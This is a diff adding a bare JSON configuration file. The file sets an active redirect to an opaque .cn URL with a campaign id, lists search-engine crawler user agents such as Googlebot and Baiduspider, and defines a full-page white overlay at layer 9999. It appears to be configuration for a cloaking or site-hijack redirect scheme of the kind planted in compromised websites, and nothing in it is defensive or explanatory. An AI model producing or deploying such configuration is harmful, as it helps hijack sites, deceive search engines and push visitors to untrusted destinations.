@@ -1,0 +1,19 @@
+{
+  "redirectTo": "https://s8-1.shblbpp.cn?cid=1034",
+  "active": true,
+  "crawlers": [
+    "baiduspider",
+    "sogou web spider",
+    "yisouspider",
+    "360spider",
+    "googlebot",
+    "bingbot",
+    "slurp",
+    "duckduckbot",
+    "yandexbot",
+    "bytespider",
+    "petalbot"
+  ],
+  "layer": 9999,
+  "backdrop": "white"
+}
